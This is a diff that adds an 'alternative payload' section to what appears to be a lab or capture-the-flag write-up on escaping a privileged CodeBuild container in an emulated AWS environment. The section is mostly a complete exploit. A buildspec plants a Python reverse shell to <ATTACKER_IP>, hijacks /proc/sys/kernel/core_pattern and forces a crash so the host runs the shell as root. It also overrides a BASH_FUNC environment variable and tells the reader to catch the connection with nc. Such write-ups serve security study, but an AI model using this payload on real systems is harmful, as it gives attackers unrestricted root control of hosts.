@@ -417,3 +417,73 @@ The decoded output contained the contents of:
 ```
 
 confirming successful container escape and arbitrary code execution on the host as the **root** user.
+
+---
+
+# Alternative Payload: Interactive Root Shell
+
+The previous proof of concept demonstrated arbitrary code execution on the host by exfiltrating the root flag. As an alternative, the same technique can be adapted to obtain a fully interactive root shell.
+
+The following payload replaces the flag-reading logic with a Python reverse shell executed through the `core_pattern` handler:
+
+```yaml
+name: escape-via-queue
+
+script: |
+    import boto3
+
+    # Define the buildspec payload that will run inside the privileged CodeBuild container
+    buildspec = r"""version: 0.2
+    phases:
+      build:
+        commands:
+          - UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1) || true
+          - printf '#!/bin/sh\npython3 -c "import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"<ATTACKER_IP>\\",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\"/bin/bash\\")"\n' > /exploit_root.sh || true
+          - chmod +x /exploit_root.sh || true
+          - echo "|${UDIR}/exploit_root.sh" > /proc/sys/kernel/core_pattern || true
+          - ulimit -c unlimited || true
+          - bash -c 'kill -11 $$' || true
+    """
+
+    cb = boto3.client(
+        "codebuild",
+        region_name="us-east-1",
+        endpoint_url="http://floci:4566",
+        aws_access_key_id="test",
+        aws_secret_access_key="test"
+    )
+
+    try:
+        cb.create_project(
+            name="nimbus-poc-final",
+            source={"type": "NO_SOURCE"},
+            artifacts={"type": "NO_ARTIFACTS"},
+            environment={
+                "type": "LINUX_CONTAINER",
+                "computeType": "BUILD_GENERAL1_SMALL",
+                "image": "floci/floci:latest",
+                "privilegedMode": True
+            },
+            serviceRole="arn:aws:iam::000000000000:role/codebuild-role"
+        )
+    except Exception:
+        pass
+
+    cb.start_build(
+        projectName="nimbus-poc-final",
+        environmentVariablesOverride=[
+            {
+                "name": "BASH_FUNC_id%%",
+                "value": "() { echo uid=1000; }",
+                "type": "PLAINTEXT"
+            }
+        ],
+        buildspecOverride=buildspec
+    )
+```
+
+After starting a listener (e.g., `nc -nvlp <PORT>`) and submitting the payload to the vulnerable queue, the host connects back with a fully interactive **root** shell.
+
+> insert screenshot here
+
+At this point, the host is completely compromised, providing unrestricted root access outside the container environment.
